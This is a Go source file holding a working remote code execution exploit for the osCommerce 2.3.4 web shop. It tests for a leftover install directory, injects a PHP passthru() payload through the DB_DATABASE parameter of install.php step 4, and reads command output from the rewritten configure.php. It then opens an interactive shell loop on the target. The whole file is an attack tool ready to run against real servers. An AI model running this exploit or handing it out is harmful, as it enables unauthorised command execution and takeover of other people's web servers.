package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("please specify the osCommerce url")
		fmt.Println("format: go run osCommerce2_3_4RCE.go <url>")
		fmt.Println("eg: go run osCommerce2_3_4RCE.go http://localhost/oscommerce-2.3.4/catalog")
		os.Exit(0)
	}

	baseUrl := os.Args[1]
	testVulnUrl := baseUrl + "/install/install.php"

	// Testing vulnerability accessing the directory
	resp, err := http.Get(testVulnUrl)
	if err != nil {
		fmt.Println("[!] Error accessing the install directory:", err)
		os.Exit(0)
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		fmt.Println("[*] Install directory still available, the host likely vulnerable to the exploit.")
		fmt.Println("[*] Testing injecting system command to test vulnerability")
		cmd := "whoami"

		fmt.Print("User: ")
		err := rce(baseUrl, cmd)
		if err != nil {
			fmt.Println(err)
			os.Exit(0)
		}

		for {
			fmt.Print("RCE_SHELL$ ")
			var cmd string
			fmt.Scanln(&cmd)
			err := rce(baseUrl, cmd)
			if err != nil {
				fmt.Println(err)
				os.Exit(0)
			}
		}
	} else {
		fmt.Println("[!] Install directory not found, the host is not vulnerable")
		os.Exit(0)
	}
}

func rce(baseUrl, command string) error {
	// Targeting the finish step which is step 4
	targetUrl := baseUrl + "/install/install.php?step=4"

	payload := "');"
	payload += "passthru('" + command + "');" // Injecting system command here
	payload += "/*"

	// Injecting parameter
	data := "DIR_FS_DOCUMENT_ROOT=./&DB_DATABASE=" + payload

	response, err := http.Post(targetUrl, "application/x-www-form-urlencoded", bytes.NewBufferString(data))
	if err != nil {
		return fmt.Errorf("[!] Error injecting payload: %v", err)
	}
	defer response.Body.Close()

	if response.StatusCode == 200 {
		// Successfully injected payload to config file
		readCMDUrl := baseUrl + "/install/includes/configure.php"
		cmdResponse, err := http.Get(readCMDUrl)
		if err != nil {
			return fmt.Errorf("[!] Error reading configure.php: %v", err)
		}
		defer cmdResponse.Body.Close()

		commandRsl, err := ioutil.ReadAll(cmdResponse.Body)
		if err != nil {
			return fmt.Errorf("[!] Error reading command result: %v", err)
		}

		if cmdResponse.StatusCode == 200 {
			// Removing the error message above
			lines := bytes.Split(commandRsl, []byte("\n"))
			for i := 2; i < len(lines); i++ {
				fmt.Println(string(lines[i]))
			}
		} else {
			return fmt.Errorf("[!] configure.php not found")
		}
	} else {
		return fmt.Errorf("[!] Fail to inject payload")
	}

	return nil
}

